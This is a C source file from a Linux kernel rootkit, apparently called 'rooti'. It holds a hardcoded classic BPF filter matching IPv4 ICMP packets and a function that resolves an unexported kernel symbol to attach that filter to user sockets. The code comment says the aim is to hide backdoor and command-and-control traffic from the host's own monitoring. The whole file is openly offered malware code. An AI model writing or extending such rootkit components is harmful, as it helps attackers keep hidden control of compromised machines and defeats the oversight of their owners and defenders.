#include <linux/socket.h>
#include <linux/filter.h>
#include "traffic.h"
#include "../../utils.h"

struct sock_filter icmp_filter_code[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 3, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 0, 1, 0x00000001 },
    { 0x6, 0, 0, 0x00040000 },
    { 0x6, 0, 0, 0x00000000 },
};

/*
    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
    to the filters specified by the user. This is used to conceal certain network traffic that we wish to hide,
    such as backdoor traffic or communication with C&C.
*/
int rooti_attach_traffic_filter(struct sock *sock)
{
    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);

    struct bpf_prog *bpf_program;
    int err;

    struct sock_fprog_kern filter_program = {
        .len = ARRAY_SIZE(icmp_filter_code),
        .filter = icmp_filter_code
    };

    err = bpf_prog_create(&bpf_program, &filter_program);
    if (bpf_program == NULL) {
        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
        return err;
    }

    err = ____sk_attach_prog(bpf_program, sock);
    if (err) {
        bpf_prog_destroy(bpf_program);
        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
        return err;
    }

    return 0;
}